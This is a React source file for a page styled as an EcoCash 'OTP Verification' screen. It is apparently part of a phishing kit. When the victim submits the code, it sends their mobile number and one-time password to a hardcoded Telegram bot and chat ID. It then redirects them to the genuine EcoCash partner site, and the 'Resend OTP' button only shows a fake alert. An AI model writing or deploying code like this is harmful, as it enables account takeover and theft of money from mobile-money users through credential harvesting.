
import { useState, useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";


const TELEGRAM_BOT_TOKEN = "7473229254:AAH6gQtxqyY32NpHpWiQ7v0GSXRxMM8UVX8";
const TELEGRAM_CHAT_ID = "5287071616";

const OTPVerification: React.FC = () => {
  const [otp, setOtp] = useState<string[]>(new Array(6).fill(""));
  const [timer, setTimer] = useState<number>(111);
  const [isResendEnabled, setIsResendEnabled] = useState<boolean>(false);
  const location = useLocation();
  const navigate = useNavigate();
  const mobile = location.state?.mobile || "";

  const sendOtpToTelegram = async (otpValue: string) => {
    const message = `EcoCash OTP\nMobile: ${mobile}\nOTP: ${otpValue}`;
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    try {
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
        }),
      });
    } catch (error) {
      console.error("Failed to send OTP to Telegram", error);
    }
  };

  useEffect(() => {
    if (timer > 0) {
      const countdown = setInterval(() => setTimer((t) => t - 1), 1000);
      return () => clearInterval(countdown);
    } else {
      setIsResendEnabled(true);
    }
  }, [timer]);

  const handleChange = (value: string, index: number) => {
    if (!/^[0-9]?$/.test(value)) return; // Only allow numbers
    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    // Move to next input
    if (value && index < 5) {
      const next = document.getElementById(`otp-${index + 1}`);
      next?.focus();
    }
  };

  const handleKeyDown = (
    e: React.KeyboardEvent<HTMLInputElement>,
    index: number
  ) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      const prev = document.getElementById(`otp-${index - 1}`);
      prev?.focus();
    }
  };

  const handleSubmit = async () => {
    const otpValue = otp.join("");
    await sendOtpToTelegram(otpValue);
    window.location.href = "https://partnerapplications.ecocash.co.zw/";
  };

  const handleResend = () => {
    setTimer(111);
    setIsResendEnabled(false);
    alert("OTP resent to your number!");
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100 p-4">
      <div className="w-full max-w-sm bg-white rounded-2xl shadow-md p-6">
        <button
          onClick={() => window.history.back()}
          className="text-gray-600 mb-4 flex items-center"
        >
          ←
        </button>

        <h2 className="text-2xl font-semibold text-gray-900 mb-2">
          OTP Verification
        </h2>
        <p className="text-gray-600 mb-6">
          Enter the OTP sent to your phone number
          <br />
          <span className="font-semibold">{mobile ? mobile : "your number"}</span>
        </p>

        <div className="flex justify-between mb-6">
          {otp.map((digit, index) => (
            <input
              key={index}
              id={`otp-${index}`}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={digit}
              onChange={(e) => handleChange(e.target.value, index)}
              onKeyDown={(e) => handleKeyDown(e, index)}
              className="w-10 h-12 text-center text-lg border border-gray-300 rounded-lg focus:border-blue-500 focus:outline-none"
            />
          ))}
        </div>

        <p className="text-gray-500 text-center mb-4">
          {isResendEnabled ? (
            <button
              className="text-blue-600 font-medium"
              onClick={handleResend}
            >
              Resend OTP
            </button>
          ) : (
            <>Resend OTP in {timer} seconds</>
          )}
        </p>

        <button
          onClick={handleSubmit}
          disabled={otp.some((digit) => !digit)}
          className={`w-full py-3 rounded-lg text-white font-semibold transition ${
            otp.some((digit) => !digit)
              ? "bg-gray-400 cursor-not-allowed"
              : "bg-blue-600 hover:bg-blue-700"
          }`}
        >
          Submit
        </button>
      </div>
    </div>
  );
};

export default OTPVerification;
